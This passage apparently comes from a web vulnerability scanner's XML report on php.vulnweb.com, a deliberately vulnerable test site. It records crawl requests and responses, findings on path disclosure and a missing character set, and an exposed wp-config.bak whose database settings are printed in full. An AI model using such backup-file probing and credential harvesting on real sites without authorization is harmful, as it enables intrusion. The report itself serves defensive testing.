<b>Notice</b>:  Undefined property:  objObjectType in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>205</b><br />
<br />

<b>Notice</b>:  Undefined property:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>210</b><br />
<br />
<b>Notice</b>:  Undefined property:  objObjectType in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>241</b><br />
<br />
<b>Notice</b>:  Undefined variable:  strXMLContent in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>314</b><br />

<br />
<b>Notice</b>:  Undefined variable:  strXMLContent in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>317</b><br />
<br />
<b>Notice</b>:  Undefined property:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>445</b><br />
<br />

<b>Warning</b>:  Sablotron error on line 1: XML parser error 3: no element found in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php</b> on line <b>70</b><br />
<br />
<b>Notice</b>:  Undefined index:  use_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>24</b><br />
<br />
<b>Notice</b>:  Undefined variable:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>34</b><br />

<br />
<b>Warning</b>:  Sablotron error on line 1: XML parser error 3: no element found in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php</b> on line <b>70</b><br />
<br />
<b>Notice</b>:  Undefined index:  ent_ancestor_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>45</b><br />
<br />

<b>Notice</b>:  Undefined index:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>56</b><br />
<br />
<b>Warning</b>:  Sablotron error on line 14: XML parser error 3: no element found in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php</b> on line <b>70</b><br />
<span  style="color=blue;font-size:9px;font-family:Verdana"><b>Erreur de transformation xslt :</b><br>&gt;&gt; N� : 2<br>&gt;&gt; Libell� : XML parser error 3: no element found<br></span>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:12 GMT</Value></Header><Header><Name>ETag</Name><Value>"516282e2-f60"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Mon, 08 Apr 2013 08:42:10 GMT</Value></Header><Header><Name>Content-Length</Name><Value>3936</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="05012BCC72AA5324539BEDF488F97A5E"><URL>http://php.vulnweb.com:80/pictures/path-disclosure-win.html</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="fb5b098f-091b-49a9-9860-f87b74453702"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>10735</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (win32)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="CWE" identifier="CWE-248" href="http://cwe.mitre.org/data/definitions/248.html">CWE-248: Uncaught Exception</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="380" length="5" /><Location offset="494" length="5" /><Location offset="612" length="5" /><Location offset="728" length="5" /><Location offset="844" length="5" /><Location offset="962" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been detected within your web application due to the discovery of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />



Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  

<br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li>

Uniform Error Codes: Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li>Informational Error Messages: Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><li>Proper Error Handling: Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.  <br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="4b071f6d-eca9-4086-af92-63bb0a03f6f5"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11550</EngineType><AttackHTTPRequest /><VulnerabilityID>11359</VulnerabilityID><Severity>0</Severity><Name>Character Set Not Enforced</Name><Classifications><Classification kind="CWE" identifier="CWE-79" href="http://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</Classification><Classification kind="CWE" identifier="CWE-116" href="http://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</Classification><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Insecure Content-Type" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Insecure Content-Type Setting</Classification></Classifications><DetectionSelection><Location offset="228" length="9" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />The Content-Type HTTP response header or the HTML meta tag provides a mechanism for the server to specify an appropriate character encoding for the response content to be rendered in the web browser. Proper specification of the character encoding through the charset parameter in the Content-Type field reduces the likelihood of misinterpretation of the characters in the response content and ensure reliable rendering of the web page.
Failure to ensure enforcement of the desired character encoding could result in client-side attacks like Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />In the absence of the character set specification, a user-agent might default to a non-standard character set, or could derive an incorrect character set based on certain characters in the response content. In some cases, both these approaches can cause the response to be incorrectly rendered. This may enable other attacks such as Cross-site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Verify the character set specification on every HTTP response. Character sets can be specified in the HTTP header or in an HTML meta tag. In the case of an XML response, the character set can be specified along with the XML Declaration.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Ensure that a suitable character set is specified for every response generated by the web application. This can be done either by, 
<ul><li>Modifying the code of the web application, which would require all pages to be modified. 
</li><li>Adding Content-Type header to the server configuration (<b>recommended</b>). This ensures that the header is added to all the responses with minimal development effort.
</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>DoD Application Security and Development STIG</b><br /><a href="http://iase.disa.mil/stigs/app_security/app_sec/app_sec.html">http://iase.disa.mil/stigs/app_security/app_sec/app_sec.html</a><br /><br /><b>UTF-7 encoding used to create XSS attack</b><br /><a href="http://www.securityfocus.com/archive/1/420001">http://www.securityfocus.com/archive/1/420001</a><br /><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="05012BCC72AA5324539BEDF488F97A5E"><![CDATA[GET /pictures/path-disclosure-win.html HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="05012BCC72AA5324539BEDF488F97A5E";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="74cb66ed";
X-Request-Memo: ID="a4df4375";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:12 GMT
ETag: "5162829e-2ba"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/html
Accept-Ranges: bytes
Last-Modified: Mon, 08 Apr 2013 08:41:02 GMT
Content-Length: 698

<br />
<b>Notice</b>:  Undefined offset:  3 in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>21</b><br />
<br />
<b>Notice</b>:  Undefined offset:  4 in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>21</b><br />
<br />

<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />
<br />
<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />
<br />
<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />

<br />
<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />

]]></RawResponse><Request id="05012BCC72AA5324539BEDF488F97A5E"><Method>GET</Method><Path>/pictures/</Path><File>path-disclosure-win</File><Ext>html</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="05012BCC72AA5324539BEDF488F97A5E";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="74cb66ed";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a4df4375";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<br />
<b>Notice</b>:  Undefined offset:  3 in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>21</b><br />
<br />
<b>Notice</b>:  Undefined offset:  4 in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>21</b><br />
<br />

<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />
<br />
<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />
<br />
<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />

<br />
<b>Notice</b>:  Undefined index:  name in <b>C:\Inetpub\wwwroot\comparatii.php</b> on line <b>38</b><br />

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:12 GMT</Value></Header><Header><Name>ETag</Name><Value>"5162829e-2ba"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Mon, 08 Apr 2013 08:41:02 GMT</Value></Header><Header><Name>Content-Length</Name><Value>698</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="BDC190423037920395D954E268F5E324"><URL>http://php.vulnweb.com:80/pictures/wp-config.bak</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="616253b1-a543-48e9-88bd-84a0ade08f71"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>1384</VulnerabilityID><Severity>3</Severity><Name>Possible PHP Source Code Disclosure</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected File" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected File</Classification><Classification kind="CWE" identifier="CWE-540" href="https://cwe.mitre.org/data/definitions/540.html">CWE-540: Information Exposure Through Source Code</Classification></Classifications><DetectionSelection><Location offset="346" length="1533" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A serious vulnerability in the web application has been detected due to the presence of publicly available PHP source code.  Obtaining PHP source code on a system allows an attacker to view the logic of the script and extract extremely useful information such as code bugs or logins and passwords.  Recommendations include removing this script from the web server and moving it to a location not accessible from the Internet.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b> For Development:</b><br /><br />

This problem usually occurs when an administrator or developer makes changes to a script and saves the old one with a guessable extension such as .old, .bac, or .bak.  Take pains to ensure that you are not inadvertently leaving source code publicly available via your web application as these files can provide attackers with a treasure trove of useful information.  
<br /><br /><b>For Security Operations:</b><br /><br />

A common characteristic of a secure web application is a clean webroot.  The more clutter that fills a webroot, the higher the chance that a piece of information that might be of value to an attacker has been overlooked.  The following recommendations will help to ensure that you are maintaining a secure web application.

<ul><li><b>Webroot Security Policy: </b> Implement a security policy that prohibits backing up source code in the webroot. </li><li><b>Cleanup Script: </b>Create a script that periodically deletes common backup files (.old, .bak, .tmp, .old, .arc, .orig, .backup, and so on) from your webroot. </li><li><b>Temporary Files:</b> Many tools and html editors automatically create  temporary file or backup files in your web root.  Be careful when editing files on a production server that you are not inadvertently leaving a backup or temporary copy of that file in the webroot. </li></ul><b>For QA:</b><br /><br />

From a QA security perspective, it is a good idea before the product is released to see what files are available via the webroot.  Has source code been left in backup files or otherwise archived in a manner which would allow public access?  Are there text files that contain notes or  other information best kept confidential?  Remember, a successful attack upon your web application will almost always involve many pieces of information gathered from disparate points within your web application.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="BDC190423037920395D954E268F5E324"><![CDATA[GET /pictures/wp-config.bak HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="BDC190423037920395D954E268F5E324";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="91452523";
X-Request-Memo: ID="a60133df";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:12 GMT
ETag: "493699b7-5ff"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 03 Dec 2008 14:37:43 GMT
Content-Length: 1535

<?php
// ** MySQL settings ** //
define('DB_NAME', 'wp265as');    // The name of the database
define('DB_USER', 'root');     // Your MySQL username
define('DB_PASSWORD', ''); // ...and password
define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');

// Change each KEY to a different unique phrase.  You won't have to remember the phrases later,
// so make them long and complicated.  You can visit http://api.wordpress.org/secret-key/1.1/
// to get keys generated for you, or just make something up.  Each key should have a different phrase.
define('AUTH_KEY', 'put your unique phrase here'); // Change this to a unique phrase.
define('SECURE_AUTH_KEY', 'put your unique phrase here'); // Change this to a unique phrase.
define('LOGGED_IN_KEY', 'put your unique phrase here'); // Change this to a unique phrase.

// You can have multiple installations in one database if you give each a unique prefix
$table_prefix  = 'wp_';   // Only numbers, letters, and underscores please!

// Change this to localize WordPress.  A corresponding MO file for the
// chosen language must be installed to wp-content/languages.
// For example, install de.mo to wp-content/languages and set WPLANG to 'de'
// to enable German language support.
define ('WPLANG', '');

/* That's all, stop editing! Happy blogging. */

if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
require_once(ABSPATH . 'wp-settings.php');
?>
]]></RawResponse><Request id="BDC190423037920395D954E268F5E324"><Method>GET</Method><Path>/pictures/</Path><File>wp-config</File><Ext>bak</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="BDC190423037920395D954E268F5E324";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="91452523";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a60133df";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<?php
// ** MySQL settings ** //
define('DB_NAME', 'wp265as');    // The name of the database
define('DB_USER', 'root');     // Your MySQL username
define('DB_PASSWORD', ''); // ...and password
define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');

// Change each KEY to a different unique phrase.  You won't have to remember the phrases later,
// so make them long and complicated.  You can visit http://api.wordpress.org/secret-key/1.1/
// to get keys generated for you, or just make something up.  Each key should have a different phrase.
define('AUTH_KEY', 'put your unique phrase here'); // Change this to a unique phrase.
define('SECURE_AUTH_KEY', 'put your unique phrase here'); // Change this to a unique phrase.
define('LOGGED_IN_KEY', 'put your unique phrase here'); // Change this to a unique phrase.

// You can have multiple installations in one database if you give each a unique prefix
$table_prefix  = 'wp_';   // Only numbers, letters, and underscores please!

// Change this to localize WordPress.  A corresponding MO file for the
// chosen language must be installed to wp-content/languages.
// For example, install de.mo to wp-content/languages and set WPLANG to 'de'
// to enable German language support.
define ('WPLANG', '');

/* That's all, stop editing! Happy blogging. */

if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');
require_once(ABSPATH . 'wp-settings.php');
?>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:12 GMT</Value></Header><Header><Name>ETag</Name><Value>"493699b7-5ff"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 03 Dec 2008 14:37:43 GMT</Value></Header><Header><Name>Content-Length</Name><Value>1535</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="AC289FB9375A9F0A1D7696CDEBA7A5A0"><URL>http://php.vulnweb.com:80/medias/css/main.css</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="AC289FB9375A9F0A1D7696CDEBA7A5A0"><![CDATA[GET /medias/css/main.css HTTP/1.1
Referer: http://php.vulnweb.com/pictures/path-disclosure-unix.html
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="AC289FB9375A9F0A1D7696CDEBA7A5A0";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="53";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="8e833e96";
X-Request-Memo: ID="e604fbb1";sc="1";tid="53";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:13 GMT
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/html
Content-Length: 153

<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.19.0</center>
</body>
</html>
]]></RawResponse><Request id="AC289FB9375A9F0A1D7696CDEBA7A5A0"><Method>GET</Method><Path>/medias/css/</Path><File>main</File><Ext>css</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/path-disclosure-unix.html</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="AC289FB9375A9F0A1D7696CDEBA7A5A0";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="53";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="8e833e96";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="e604fbb1";sc="1";tid="53";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.19.0</center>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:13 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>153</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="E78DA5D156405D07DFC076214DEA63BD"><URL>http://php.vulnweb.com:80/medias/js/common_functions.js</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="E78DA5D156405D07DFC076214DEA63BD"><![CDATA[GET /medias/js/common_functions.js HTTP/1.1
Referer: http://php.vulnweb.com/pictures/path-disclosure-unix.html
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="E78DA5D156405D07DFC076214DEA63BD";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="27";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="e32fccce";
X-Request-Memo: ID="1282a105";sc="1";tid="27";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:13 GMT
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
